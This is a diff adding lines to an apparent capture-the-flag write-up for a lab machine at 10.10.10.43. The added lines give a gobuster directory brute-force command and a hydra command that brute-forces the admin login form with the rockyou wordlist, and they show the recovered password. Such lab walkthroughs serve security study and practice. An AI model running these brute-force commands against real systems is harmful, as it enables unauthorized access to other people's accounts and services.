@@ -17,3 +17,9 @@ Running directory bruteforce:
 Visiting http://10.10.10.43/department/login.php I am greeted with a login page but no further hints. Checking the source code I see below comment:
 <!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
 That gives a hint that we have MySQL running which means PHP,MYSQL and likely a phpmyadmin page also.
+└─# gobuster dir -u https://10.10.10.43 -w /usr/share/wordlists/directory-list-2.3-medium.txt -k
+/db
+
+Bruteforcing password:
+└─# hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"
+[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
